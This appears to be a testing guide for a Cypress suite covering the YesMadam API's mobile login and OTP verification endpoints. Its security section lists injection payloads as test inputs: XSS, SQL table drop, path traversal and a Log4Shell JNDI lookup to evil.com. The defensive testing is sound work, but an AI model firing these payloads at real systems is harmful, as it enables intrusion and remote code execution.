# YesMadam API Testing Guide

This comprehensive guide covers API testing best practices, patterns, and examples specifically for the YesMadam API testing framework.

## Table of Contents

- [API Testing Fundamentals](#api-testing-fundamentals)
- [Authentication Testing](#authentication-testing)
- [Test Structure](#test-structure)
- [Custom Commands](#custom-commands)
- [Data Management](#data-management)
- [Assertions and Validations](#assertions-and-validations)
- [Error Handling](#error-handling)
- [Performance Testing](#performance-testing)
- [Best Practices](#best-practices)

## API Testing Fundamentals

### YesMadam API Endpoints

The YesMadam API follows a specific structure for authentication and user management:

```javascript
describe('YesMadam API Fundamentals', () => {
  it('POST /v3/userapi/login - Mobile number validation', () => {
    const loginRequest = {
      mobile: testData.validUser.mobile
    };

    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/login',
      body: loginRequest
    }).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.status).to.eq('success');
      expect(response.body.message).to.include('otp verification');
    });
  });

  it('POST /v3/userapi/otp/verification - OTP verification', () => {
    const otpRequest = {
      mobile: testData.validUser.mobile,
      otp: testData.validUser.otp
    };

    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/otp/verification',
      body: otpRequest
    }).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.status).to.eq('success');
      expect(response.body.object).to.have.property('user_id');
    });
  });
});
```

### Response Structure Validation

```javascript
describe('Response Structure Validation', () => {
  it('should validate login response structure', () => {
    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/login',
      body: { mobile: testData.validUser.mobile }
    }).then((response) => {
      // Validate required fields
      expect(response.body).to.have.property('status_code');
      expect(response.body).to.have.property('status');
      expect(response.body).to.have.property('message');
      expect(response.body).to.have.property('object');
      expect(response.body).to.have.property('token');
      expect(response.body).to.have.property('object2');

      // Validate data types
      expect(response.body.status_code).to.be.a('number');
      expect(response.body.status).to.be.a('string');
      expect(response.body.message).to.be.a('string');
    });
  });

  it('should validate OTP verification response structure', () => {
    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/otp/verification',
      body: {
        mobile: testData.validUser.mobile,
        otp: testData.validUser.otp
      }
    }).then((response) => {
      // Validate OTP response fields
      expect(response.body).to.have.property('status_code');
      expect(response.body).to.have.property('status');
      expect(response.body).to.have.property('message');
      expect(response.body).to.have.property('object');

      // Validate user object structure
      expect(response.body.object).to.have.property('user_id');
      expect(response.body.object).to.have.property('mobile');
    });
  });
});
```

## Test Structure

### YesMadam Test Organization

```
cypress/e2e/api/
├── auth/
│   ├── login.cy.ts              # Login endpoint tests
│   ├── otpVerification.cy.ts    # OTP verification tests
│   ├── completeAuthFlow.cy.ts   # End-to-end authentication
│   └── otpVerifications.cy.ts   # Additional OTP scenarios
├── user/
│   ├── profile.cy.ts            # User profile tests
│   └── userManagement.cy.ts     # User management tests
└── performance/
    └── apiPerformance.cy.ts     # Performance tests
```

### Test File Naming Convention

- `featureName.cy.ts` - Main test files (e.g., `login.cy.ts`)
- `completeFeatureFlow.cy.ts` - End-to-end workflow tests
- `featureValidation.cy.ts` - Input validation tests
- `featurePerformance.cy.ts` - Performance tests

### Test Tags and Metadata

```javascript
describe('Authentication API - Login', {
  tags: ['@api', '@auth', '@login', '@regression'],
  author: 'QA Team'
}, () => {

  beforeEach(() => {
    cy.log('Starting authentication test');
    Logger.info('Testing login endpoint with valid mobile number');
  });

  it('should successfully send OTP for valid mobile number', () => {
    Logger.info('Testing login endpoint with valid mobile number');

    ApiHelper.post('/v3/userapi/login', {
      mobile: testData.validUser.mobile
    }).then((response) => {
      // Test implementation
    });
  });
});
```

## Custom Commands

### YesMadam API Commands

```javascript
// Basic API request using ApiHelper
ApiHelper.post('/v3/userapi/login', {
  mobile: testData.validUser.mobile
}).then((response) => {
  expect(response.status).to.eq(200);
  expect(response.body.status).to.eq('success');
});

// Enhanced API request with custom commands
cy.apiRequest({
  method: 'POST',
  url: '/v3/userapi/login',
  body: { mobile: testData.validUser.mobile }
}).then((response) => {
  Logger.success('Login request completed');
});

// Complete authentication flow
cy.login(testData.validUser.mobile, testData.validUser.otp).then((response) => {
  expect(response.body.status).to.eq('success');
  cy.getAuthToken().should('exist');
});
```

### Response Validation Commands

```javascript
cy.apiRequest({
  method: 'POST',
  url: '/v3/userapi/login',
  body: { mobile: testData.validUser.mobile }
}).then((response) => {
  // Validate status code
  ResponseValidator.validateStatusCode(response, 200);

  // Validate response time (3 seconds max)
  ResponseValidator.validateResponseTime(response, 3000);

  // Validate required fields exist
  ResponseValidator.validateBodyHasKeys(response.body, [
    'status_code', 'status', 'message', 'object', 'token', 'object2'
  ]);

  // Validate specific values
  ResponseValidator.validateBodyProperty(response.body, 'status', 'success');
  ResponseValidator.validateBodyProperty(response.body, 'status_code', 401);

  // Validate data types
  ResponseValidator.validateBodyPropertyType(response.body, 'status_code', 'number');
  ResponseValidator.validateBodyPropertyType(response.body, 'status', 'string');
});
```

### Authentication Commands

```javascript
// Login with mobile and OTP
cy.login(testData.validUser.mobile, testData.validUser.otp).then((response) => {
  expect(response.status).to.eq(200);
  expect(response.body.status).to.eq('success');
});

// Get stored auth token
cy.getAuthToken().then((token) => {
  if (token) {
    Logger.info(`Auth token: ${token.substring(0, 20)}...`);
  }
});

// Set auth token manually
cy.setAuthToken('your-auth-token-here');
```

## Data Management

### YesMadam Test Data Structure

```javascript
// Load test data from fixtures
before(() => {
  cy.fixture('testData').then((data) => {
    testData = data;
  });

  cy.fixture('schemas').then((data) => {
    schemas = data;
  });
});

// Access test data in tests
it('should use valid user data', () => {
  const requestBody = {
    mobile: testData.validUser.mobile
  };

  ApiHelper.post('/v3/userapi/login', requestBody).then((response) => {
    // Test implementation
  });
});
```

### Test Data Files

#### `cypress/fixtures/testData.json`
```json
{
  "validUser": {
    "mobile": 9855566677,
    "otp": 2222
  },
  "invalidUser": {
    "mobile": 1234567890,
    "otp": 9999
  },
  "endpoints": {
    "login": "/v3/userapi/login",
    "otpVerification": "/v3/userapi/otp/verification"
  },
  "expectedResponses": {
    "login": {
      "status_code": 401,
      "status": "success",
      "message": "move on otp verification page"
    }
  }
}
```

#### `cypress/fixtures/schemas.json`
```json
{
  "loginResponseSchema": {
    "status_code": "number",
    "status": "string",
    "message": "string",
    "object": "object",
    "token": "object",
    "object2": "object"
  },
  "otpVerificationResponseSchema": {
    "status_code": "number",
    "status": "string",
    "message": "string",
    "object": "object"
  }
}
```

## Assertions and Validations

### YesMadam Response Assertions

```javascript
describe('Authentication Response Assertions', () => {
  it('should validate login response structure', () => {
    ApiHelper.post('/v3/userapi/login', {
      mobile: testData.validUser.mobile
    }).then((response) => {
      // Basic response assertions
      expect(response.status).to.eq(200);
      expect(response.body).to.be.an('object');
      expect(response.duration).to.be.lessThan(3000);

      // Login-specific assertions
      expect(response.body.status_code).to.eq(401);
      expect(response.body.status).to.eq('success');
      expect(response.body.message).to.include('otp verification');

      // Object structure validation
      expect(response.body.object).to.be.an('object');
      expect(response.body.token).to.be.an('object');
      expect(response.body.object2).to.be.an('object');
    });
  });

  it('should validate OTP verification response', () => {
    cy.login(testData.validUser.mobile, testData.validUser.otp).then((response) => {
      // OTP response assertions
      expect(response.body.status_code).to.eq(0);
      expect(response.body.status).to.eq('success');

      // User object validation
      expect(response.body.object).to.be.an('object');
      expect(response.body.object).to.have.property('user_id');
      expect(response.body.object).to.have.property('mobile');
      expect(response.body.object).to.have.property('email');

      // Auth token validation
      expect(response.body.message).to.be.a('string');
      expect(response.body.message.length).to.be.greaterThan(0);
    });
  });
});
```

### Schema Validation

```javascript
describe('Schema Validation', () => {
  it('should validate login response schema', () => {
    ApiHelper.post('/v3/userapi/login', {
      mobile: testData.validUser.mobile
    }).then((response) => {
      ResponseValidator.validateSchema(response.body, schemas.loginResponseSchema);
    });
  });

  it('should validate OTP response schema', () => {
    cy.login(testData.validUser.mobile, testData.validUser.otp).then((response) => {
      ResponseValidator.validateSchema(response.body, schemas.otpVerificationResponseSchema);

      // Additional user object schema validation
      ResponseValidator.validateSchema(response.body.object, schemas.userObjectSchema);
    });
  });
});
```

## Error Handling

### YesMadam Error Scenarios

```javascript
describe('Authentication Error Handling', () => {
  it('should handle invalid mobile number format', () => {
    ApiHelper.makeRequest({
      url: '/v3/userapi/login',
      method: 'POST',
      body: { mobile: 1234567 }, // Invalid format
      failOnStatusCode: false
    }).then((response) => {
      // Should handle gracefully
      expect([200, 400, 401, 422]).to.include(response.status);
      Logger.info(`Response status for invalid mobile: ${response.status}`);
    });
  });

  it('should handle missing mobile number', () => {
    ApiHelper.makeRequest({
      url: '/v3/userapi/login',
      method: 'POST',
      body: {}, // Missing mobile field
      failOnStatusCode: false
    }).then((response) => {
      expect([200, 400, 422]).to.include(response.status);
      Logger.info('Missing field validation working as expected');
    });
  });

  it('should handle incorrect OTP', () => {
    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/otp/verification',
      body: {
        mobile: testData.validUser.mobile,
        otp: 9999 // Wrong OTP
      },
      failOnStatusCode: false
    }).then((response) => {
      expect([200, 400, 401]).to.include(response.status);
      Logger.warning('Incorrect OTP handled appropriately');
    });
  });
});
```

### Network and Timeout Handling

```javascript
describe('Network Error Handling', () => {
  it('should handle API timeouts', () => {
    ApiHelper.makeRequest({
      url: '/v3/userapi/login',
      method: 'POST',
      body: { mobile: testData.validUser.mobile },
      timeout: 1, // Very short timeout
      failOnStatusCode: false
    }).then((response) => {
      // Should handle timeout gracefully
      if (response.duration >= 1) {
        Logger.warning('Request timed out as expected');
      }
    });
  });

  it('should validate response time limits', () => {
    ApiHelper.post('/v3/userapi/login', {
      mobile: testData.validUser.mobile
    }).then((response) => {
      ResponseValidator.validateResponseTime(response, 5000);
      Logger.success(`Response time: ${response.duration}ms`);
    });
  });
});
```

## Performance Testing

### YesMadam Performance Requirements

```javascript
describe('Authentication Performance Tests', () => {
  it('should respond within acceptable time for login', () => {
    const startTime = Date.now();

    ApiHelper.post('/v3/userapi/login', {
      mobile: testData.validUser.mobile
    }).then((response) => {
      const responseTime = Date.now() - startTime;

      // Should respond within 3 seconds
      ResponseValidator.validateResponseTime(response, 3000);

      Logger.success(`Login response time: ${response.duration}ms`);
      cy.log(`⚡ Response time: ${response.duration}ms`);
    });
  });

  it('should validate OTP verification performance', () => {
    cy.login(testData.validUser.mobile, testData.validUser.otp).then((response) => {
      // Should respond within 2 seconds
      ResponseValidator.validateResponseTime(response, 2000);

      Logger.success(`OTP verification time: ${response.duration}ms`);
    });
  });

  it('should validate complete authentication flow performance', () => {
    const startTime = Date.now();

    cy.login(testData.validUser.mobile, testData.validUser.otp).then((response) => {
      const totalTime = Date.now() - startTime;

      // Complete flow should be under 5 seconds
      expect(totalTime).to.be.lessThan(5000);

      Logger.success(`Complete auth flow: ${totalTime}ms`);
    });
  });
});
```

## Security Testing

### YesMadam Authentication Security

```javascript
describe('Authentication Security Tests', () => {
  it('should validate mobile number format security', () => {
    // Test various mobile number formats
    const testCases = [
      { mobile: '123', expectedError: true },
      { mobile: 'abcdefghijk', expectedError: true },
      { mobile: '12345678901', expectedError: true },
      { mobile: '1234567890', expectedError: false }
    ];

    testCases.forEach((testCase) => {
      cy.apiRequest({
        method: 'POST',
        url: '/v3/userapi/login',
        body: { mobile: testCase.mobile },
        failOnStatusCode: false
      }).then((response) => {
        if (testCase.expectedError) {
          expect([400, 422]).to.include(response.status);
        } else {
          expect(response.status).to.eq(200);
        }
      });
    });
  });

  it('should handle OTP brute force protection', () => {
    const mobile = testData.validUser.mobile;

    // Attempt multiple wrong OTPs
    for (let i = 0; i < 5; i++) {
      cy.apiRequest({
        method: 'POST',
        url: '/v3/userapi/otp/verification',
        body: { mobile: mobile, otp: 9999 },
        failOnStatusCode: false
      }).then((response) => {
        // Should handle gracefully without server crash
        expect(response.status).to.not.eq(500);
      });
    }
  });
});
```

### Input Validation Security

```javascript
describe('Input Validation Security', () => {
  it('should handle malicious input safely', () => {
    const maliciousInputs = [
      { mobile: '<script>alert("xss")</script>' },
      { mobile: "'; DROP TABLE users; --" },
      { mobile: '../../../etc/passwd' },
      { mobile: '${jndi:ldap://evil.com/a}' }
    ];

    maliciousInputs.forEach((input) => {
      cy.apiRequest({
        method: 'POST',
        url: '/v3/userapi/login',
        body: input,
        failOnStatusCode: false
      }).then((response) => {
        // Should not crash server
        expect(response.status).to.not.eq(500);
        // Should return validation error
        expect([400, 422]).to.include(response.status);
      });
    });
  });

  it('should validate input length limits', () => {
    // Test extremely long input
    const longMobile = '1'.repeat(50);

    cy.apiRequest({
      method: 'POST',
      url: '/v3/userapi/login',
      body: { mobile: longMobile },
      failOnStatusCode: false
    }).then((response) => {
      expect([400, 422]).to.include(response.status);
    });
  });
});
```

## Best Practices

### 1. YesMadam Test Organization

- **Group by API endpoint**: `login.cy.ts`, `otpVerification.cy.ts`
- **Use descriptive test names**: `should successfully send OTP for valid mobile number`
- **Separate test types**: Unit tests, integration tests, performance tests
- **Tag tests appropriately**: `@api`, `@auth`, `@regression`

### 2. YesMadam Data Management

- **Use fixture files**: `testData.json` and `schemas.json`
- **Leverage test data structure**: `testData.validUser.mobile`, `testData.validUser.otp`
- **Environment-specific data**: Different data per environment
- **Dynamic data generation**: Use random mobile numbers when needed

### 3. YesMadam Assertions

- **Multi-layer validation**: Status code → Response structure → Business logic
- **Use ResponseValidator**: `ResponseValidator.validateStatusCode(response, 200)`
- **Schema validation**: `ResponseValidator.validateSchema(response.body, schema)`
- **Performance validation**: `ResponseValidator.validateResponseTime(response, 3000)`

### 4. YesMadam Error Handling

- **Graceful degradation**: Use `failOnStatusCode: false` for expected errors
- **Comprehensive logging**: Use `Logger.info()`, `Logger.error()`, `Logger.success()`
- **Error context**: Log request details with errors
- **Screenshot on failure**: Automatic failure screenshots

### 5. YesMadam Performance

- **Response time limits**: Login < 3s, OTP verification < 2s, Complete flow < 5s
- **Timeout configuration**: Environment-specific timeouts
- **Performance monitoring**: Track response times in reports
- **Load testing**: Validate concurrent authentication requests

### 6. YesMadam Security

- **Input validation**: Test mobile number format validation
- **OTP security**: Test OTP expiration and attempt limits
- **Rate limiting**: Validate API rate limiting behavior
- **Error information**: Ensure errors don't leak sensitive information

### 7. YesMadam Maintainability

- **Use ApiHelper**: `ApiHelper.post()`, `ApiHelper.get()`, etc.
- **Custom commands**: `cy.login()`, `cy.apiRequest()`, `cy.validateStatus()`
- **Utility classes**: `Logger`, `ResponseValidator`
- **Clear documentation**: Document complex authentication flows

## Examples

### Complete YesMadam Authentication Test

```javascript
describe('Complete Authentication Flow', () => {
  let testData;
  let schemas;

  before(() => {
    cy.fixture('testData').then((data) => {
      testData = data;
    });
    cy.fixture('schemas').then((data) => {
      schemas = data;
    });
  });

  describe('End-to-End Login Flow', () => {
    it('should complete full authentication flow', () => {
      Logger.info('Starting complete authentication flow');

      // Step 1: Login with mobile number
      cy.apiRequest({
        method: 'POST',
        url: '/v3/userapi/login',
        body: {
          mobile: testData.validUser.mobile,
        },
      }).then((loginResponse) => {
        // Validate login response
        expect(loginResponse.status).to.equal(200);
        expect(loginResponse.body.status).to.equal('success');
        expect(loginResponse.body.message).to.include('otp verification');

        Logger.success('Step 1: Login successful - OTP sent');

        // Step 2: Verify OTP
        cy.apiRequest({
          method: 'POST',
          url: '/v3/userapi/otp/verification',
          body: {
            mobile: testData.validUser.mobile,
            otp: testData.validUser.otp,
          },
        }).then((otpResponse) => {
          // Validate OTP verification response
          expect(otpResponse.status).to.equal(200);
          expect(otpResponse.body.status_code).to.equal(0);
          expect(otpResponse.body.status).to.equal('success');

          // Validate auth token
          const authToken = otpResponse.body.message;
          expect(authToken).to.be.a('string');
          expect(authToken.length).to.be.greaterThan(0);

          // Validate user details
          expect(otpResponse.body.object).to.have.property('user_id');
          expect(otpResponse.body.object).to.have.property('email');
          expect(otpResponse.body.object).to.have.property('mobile');

          // Store auth token
          cy.setAuthToken(authToken);

          Logger.success('Step 2: OTP verification successful');
          Logger.success('Complete authentication flow passed');
        });
      });
    });

    it('should use custom login command for authentication', () => {
      Logger.info('Testing custom login command');

      cy.login(testData.validUser.mobile, testData.validUser.otp).then((response) => {
        expect(response.status).to.equal(200);
        const responseBody = response.body;
        expect(responseBody.status).to.equal('success');

        cy.getAuthToken().then((token) => {
          expect(token).to.exist;
          expect(token).to.be.a('string');
          Logger.success('Custom login command working correctly');
        });
      });
    });
  });

  describe('Authentication State Management', () => {
    it('should persist auth token across tests', () => {
      // Login first
      cy.login(testData.validUser.mobile, testData.validUser.otp);

      // Verify token is stored
      cy.getAuthToken().then((token) => {
        expect(token).to.exist;
        expect(token).to.be.a('string');
        Logger.success('Auth token persisted successfully');
      });
    });
  });
});
```

### Individual Endpoint Test Example

```javascript
describe('Authentication API - Login', () => {
  let testData;
  let schemas;

  before(() => {
    cy.fixture('testData').then((data) => {
      testData = data;
    });
    cy.fixture('schemas').then((data) => {
      schemas = data;
    });
  });

  describe('POST /v3/userapi/login', () => {
    it('should successfully send OTP for valid mobile number', () => {
      const endpoint = '/v3/userapi/login';
      const requestBody = {
        mobile: testData.validUser.mobile,
      };

      Logger.info('Testing login endpoint with valid mobile number');

      ApiHelper.post(endpoint, requestBody).then((response) => {
        // Validate status code
        ResponseValidator.validateStatusCode(response, 200);

        // Validate response time
        ResponseValidator.validateResponseTime(response, 3000);

        // Validate response body structure
        ResponseValidator.validateBodyHasKeys(response.body, [
          'status_code',
          'status',
          'message',
          'object',
          'token',
          'object2',
        ]);

        // Validate specific values
        ResponseValidator.validateBodyProperty(response.body, 'status_code', 401);
        ResponseValidator.validateBodyProperty(response.body, 'status', 'success');
        ResponseValidator.validateBodyProperty(
          response.body,
          'message',
          'move on otp verification page'
        );

        // Validate schema
        ResponseValidator.validateSchema(response.body, schemas.loginResponseSchema);

        Logger.success('Login API test passed successfully');
      });
    });

    it('should handle invalid mobile number gracefully', () => {
      const endpoint = '/v3/userapi/login';
      const requestBody = {
        mobile: 1234567, // Invalid mobile number
      };

      Logger.info('Testing login with invalid mobile number');

      ApiHelper.makeRequest({
        url: endpoint,
        method: 'POST',
        body: requestBody,
        failOnStatusCode: false,
      }).then((response) => {
        // Validate that response is received (status code may vary)
        expect(response.status).to.be.oneOf([200, 400, 401, 422]);

        Logger.info(`Response status for invalid mobile: ${response.status}`);
      });
    });
  });
});
```

This guide provides comprehensive coverage of YesMadam API testing practices and patterns. For more specific examples, refer to the test files in the `cypress/e2e/api/auth/` directory.